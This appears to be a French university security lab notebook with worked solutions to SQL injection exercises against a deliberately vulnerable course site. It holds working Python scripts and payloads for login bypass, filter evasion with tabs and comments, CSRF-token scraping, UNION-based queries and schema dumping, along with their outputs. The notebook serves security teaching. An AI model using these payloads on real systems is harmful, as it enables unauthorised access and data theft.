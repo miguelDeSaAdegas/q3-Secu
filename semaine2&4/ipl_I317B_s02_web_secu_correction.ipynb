{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ipl I317B Sécurité : labos\n",
    "## Semaine 2 : Vulnérabilitées web - Injection SQL (1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1a:\n",
    "Pour ce premier exercice, nous vous demandons de passer le formulaire de connexion codé par un mauvais développeur : http://labosecuipl.alwaysdata.net/23/s02/ex1a/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex1a/\",\n",
    "    data={\n",
    "        \"login\": '\" or 1=1;--',\n",
    "        \"password\": \"\"\n",
    "    }\n",
    ")\n",
    "\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <...> FROM <...> WHERE login=\"<webform input>\" and password=\"<webform input>\""
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <...> FROM <...> WHERE login=\"\" or 1=1;--\" and password=\"<webform input>\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1b:\n",
    "Une variante du précédant formulaire a été mit en place, connectez-vous à nouveau à celui-ci : http://labosecuipl.alwaysdata.net/23/s02/ex1b/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex1b/\",\n",
    "    data={\n",
    "        \"login\": '\\' or 1=1;-- ',\n",
    "        \"password\": \"\"\n",
    "    }\n",
    ")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <...> FROM <...> WHERE login='<webform input>' and password='<webform input>'"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <...> FROM <...> WHERE login='' or 1=1;--' and password='<webform input>'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 2:\n",
    "Une variante du précédant formulaire a été mit en place, connectez-vous à nouveau à celui-ci : http://labosecuipl.alwaysdata.net/23/s02/ex2/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Ho non :'-(\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex2/\",\n",
    "    data={\n",
    "        \"login\": '\\') or 1=1;-- ',\n",
    "        \"password\": \"\"\n",
    "    }\n",
    ")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "Si on inject :  or 1=1;--'\n",
    "On obtient \n",
    "\n",
    "Warning: PDO::query(): SQLSTATE[HY000]: General error: 1 unrecognized token: \"' or 1=1;--'' and `password`='');\" in /home/labosecuipl/www/23/s02/ex2/index.php on line 12\n",
    "\n",
    "Le message d'erreur nous montre explicitement le reste de la requête ainsi que la présence d'un ')' à la fin."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <...> FROM <...> WHERE (login='' and `password`='');"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <...> FROM <...> WHERE (login='') or 1=1;--' and `password`='');"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 3:\n",
    "Dans cette nouvelle version, le développeur semble avoir prit conscience que certains caractères ne devraient pas être accepté ... mais vous êtes plus malin que lui, n'est-ce pas ?\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/23/s02/ex3/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex3/\",\n",
    "    data={\n",
    "        \"login\": \"\",\n",
    "        \"password\": '\" or 1<3;--'.replace(\" \", \"\\t\"),\n",
    "    }\n",
    ")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")\n",
    "    print(page.text)"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "Il existe plein de manière différente de contourner les limitations mise-en-place par le mauvais développeur dans cette exercice :\n",
    "- interdiction du caractère espace:\n",
    "  - Remplacer les caractères espace par d'autres symbole similaire : retour à la ligne \\n, tabulation \\t, retour chariot \\r,...\n",
    "  - utiliser des commentaires pour simuler des espaces : \"/**/or/**/1=1;--\n",
    "  - utiliser des parenthaises pour délimiter les éléments de la syntaxe sql : \"or(1<3);--\n",
    "  - ...\n",
    "- interdiction du caractère égal\n",
    "  - usage de n'importe quelle valeur qui vaut \"vrai\": 1<2, true, 1, '1' LIKE '1',...\n",
    "\n",
    "Développer soit-même des méthodes de \"nettoyage\" pour se protéger des injections SQL est une mauvaise idée ! Il faut utiliser les standards du langage ou de la librairie utilisé pour se protéger (eg: ORM, prepare statment, PDO,...). "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 4:\n",
    "\n",
    "Une variante du précédant formulaire a été mit en place, il semblerait que notre mauvais dev veuille cette fois-ci empêcher les requêtes automatisées.\n",
    "Encore une fois, trouvez le moyen de vous y connecter : http://labosecuipl.alwaysdata.net/23/s02/ex4/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<p id='result'>Good job, it's time to do the next exercice !</p></html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "\n",
    "# on utilise un objet \"Session\" pour garder de la persistance (les cookies) d'une requête à l'autre.\n",
    "session = requests.session()\n",
    "\n",
    "# on se fait passé pour autre chose qu'une lib python en préparant un autre user-agent.\n",
    "headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'}\n",
    "\n",
    "page_form = session.get(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex4/\"\n",
    ")\n",
    "soup = BeautifulSoup(page_form.text)\n",
    "token = soup.find(\"input\", {\"type\": \"hidden\"})['value']\n",
    "\n",
    "page = session.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex4/\",\n",
    "    data={\n",
    "        \"login\": \"\",\n",
    "        \"password\": '\\' or 2;--'.replace(\" \", \"\\n\"),\n",
    "        \"token\": token  # on ajoute le token récupéré précédement\n",
    "    },\n",
    "    headers=headers\n",
    ")\n",
    "print(page.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 5:\n",
    "Un espion sur place m'a confirmé que, ne parvenant pas à circonvenir nos injections, le dévelopeur derrière ce site à juste décidé de vider la base de donnée `users`. Il s'est venté bruyament de sa nouvelle idée à coté de la machine à café :\n",
    "\n",
    "> \"J'ai vidé la base de donnée ! Haha ! La requête sql de connexion ne peut plus renvoyé de login utilisateur donc impossible pour eux de se connecter ! Haha, ces maudits hackers ne m'auront pas cette fois-ci !\".\n",
    "\n",
    "Désormait, toutes les requêtes, même injectée \"toujours vraie\" sont vide ... C'est embêtant mais je suis sûr qu'on peut arranger le coup !\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/23/s02/ex5/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex5/\",\n",
    "    data={\n",
    "        \"login\": \" ' UNION SELECT null, null;-- \",\n",
    "        \"password\": \"\",\n",
    "    }\n",
    ")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")\n",
    "    print(page.text)"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "Le mot clé \"UNION\" permet de joindre deux SELECT différent. Il est nécessaire que les deux parties du UNION aient le même nombre d'élément dans les SELECT pour éviter une erreur de type :\n",
    "\n",
    "Warning: PDO::query(): SQLSTATE[HY000]: General error: 1 SELECTs to the left and right of UNION do not have the same number of result columns in /home/labosecuipl/www/23/s02/ex5/index.php on line 13\n",
    "\n",
    "\n",
    "Dans cette exercice, il faut deux éléments. Il n'est pas possible de savoir pour sûr le nombre d'élément à mettre, il faut faire une supposition basé sur le fonctionnement apparant du site et la confirmer avec un test."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 6a:\n",
    "Pour ce nouvel exercice, nous allons utiliser un nouveau formulaire. Ce formulaire nous permet de chercher parmi les éléments du tableau périodique des éléments. Par exemple, si vous cherchez \"Co*\", vous obtiendrez les informations sur le copper (cuivre) et le cobalt.\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/23/s02/ex6/\n",
    "\n",
    "Commencez par récupérer le numéro de version de notre base de donnée. Ici, nous connaissons le type de base de donnée : SQLITE, un petit détour par la documentation nous permet deconnaître la fonction parfait pour cela : https://www.sqlite.org/lang_corefunc.html#sqlite_version."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "from bs4 import BeautifulSoup\n",
    "\n",
    "def create_inject(fields, table=\"\"):\n",
    "    \"\"\"\n",
    "    Crée le string de l'injection\n",
    "    \n",
    "    fields: liste de string a mettre dans le SELECT.\n",
    "    table: le nom de la table où on veut SELECT (optionnel)\n",
    "    \"\"\"\n",
    "    while len(fields) < 21:\n",
    "        fields.append(\"''\")  # on ajoute suffisament de champ vide pour avoir 21 champs (pour le UNION)\n",
    "    injection = \" ' UNION SELECT \" + ','.join(fields)\n",
    "    \n",
    "    if table:  # Un string vide est évalué à False\n",
    "        injection += \" FROM \" + table\n",
    "    injection += \" ;--\"\n",
    "    \n",
    "    print(injection)\n",
    "    return injection\n",
    "\n",
    "def inject(injection):\n",
    "    \"\"\"\n",
    "    Procède à l'injection et retourne la page injectée\n",
    "    \n",
    "    injection: l'injection à soumettre sur le site\n",
    "    \"\"\"\n",
    "    page = requests.get(\n",
    "        \"http://labosecuipl.alwaysdata.net/23/s02/ex6/\",\n",
    "        params={ \"name\": injection }\n",
    "    )\n",
    "    return page.text\n",
    "\n",
    "def parse_page(html):\n",
    "    \"\"\"\n",
    "    Parse le tableau de la page html et le retourne sous la forme d'une liste de liste.\n",
    "    \n",
    "    html: Un string représentant la page à parser.\n",
    "    \"\"\"\n",
    "    soup = BeautifulSoup(html)\n",
    "    result = []\n",
    "    for tr in soup.find_all(\"tr\")[1:]:\n",
    "        row = []\n",
    "        for td in tr.find_all(\"td\"):\n",
    "            row.append(td.text)\n",
    "        result.append(row)\n",
    "    return result"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " ' UNION SELECT sqlite_version(),'','','','','','','','','','','','','','','','','','','','' ;--\n",
      "[['3.27.2', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '']]\n"
     ]
    }
   ],
   "source": [
    "print(parse_page(inject(create_inject([\"sqlite_version()\"]))))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT < les 21 champs de la table > FROM < table > WHERE name LIKE '< input utilisateur >';"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 6b:\n",
    "Dans le même ordre d’idée, je vous invite à récupérer la liste des tables présentes dans cette base de donnée.\n",
    "\n",
    "Comme souvent, la lecture de la documentation peut vous faciliter la vie : https://www.sqlite.org/faq.html#q7\n",
    "\n",
    "<sup><sub>(Et comme bien souvent ... la vrai vie c'est compliqué : https://www.sqlite.org/schematab.html#alternative_names )</sub></sup>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " ' UNION SELECT name,sql,'','','','','','','','','','','','','','','','','','','' FROM sqlite_master ;--\n",
      "--------------\n",
      "| elements\n",
      "--------------\n",
      "CREATE TABLE elements (name TEXT, symbol TEXT, atomic_number TEXT, atomic_weight TEXT, density TEXT, melting_point TEXT, boiling_point TEXT, atomic_radius TEXT, covalent_radius TEXT, ionic_radius TEXT, specific_volume TEXT, specific_heat TEXT, heat_fusion TEXT, heat_evaporation TEXT, thermal_conductivity TEXT, pauling_electronegativity TEXT, first_ionisation_energy TEXT, oxidation_states TEXT, electronic_configuration TEXT, lattice TEXT, lattice_constant TEXT)\n",
      "\n",
      "--------------\n",
      "| gemstones\n",
      "--------------\n",
      "CREATE TABLE gemstones(gemstone TEXT, crystal_system TEXT, density TEXT, hardness TEXT, refractive_index TEXT, threatments TEXT)\n",
      "\n",
      "--------------\n",
      "| planets\n",
      "--------------\n",
      "CREATE TABLE planets('planet' TEXT, 'Distance_from_Sun_per_million_km' TEXT, 'Year_Length_per_Earth_years' TEXT, 'Day_Length_per_Earth_Days' TEXT, 'Orbital_Speed_per_km_per_s' TEXT, 'Diameter_per_km' TEXT, 'Mass_per_1022_kg' TEXT, 'Density_per_kg_per_m3' TEXT, 'Surface_Gravity_per_m_per_s2' TEXT, 'Escape_Velocity_per_km_per_s' TEXT, 'Temperature_min_per_C' TEXT, 'Temperature_max_per_C' TEXT, 'Temperature_mean_per_C' TEXT)\n",
      "\n"
     ]
    }
   ],
   "source": [
    "for row in parse_page(inject(create_inject([\"name\", \"sql\"], \"sqlite_master\"))):\n",
    "    print(\"--------------\")\n",
    "    print(\"| \" + row[0])\n",
    "    print(\"--------------\")\n",
    "    print(row[1])\n",
    "    print()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 6c (bonus):\n",
    "Maintenant que vous connaissez toutes les tables dans cette base de données ainsi que le nom de chaque champ, pourquoi ne pas récupérer le contenu de chacune de ces tables ?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [],
   "source": [
    "#TODO"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
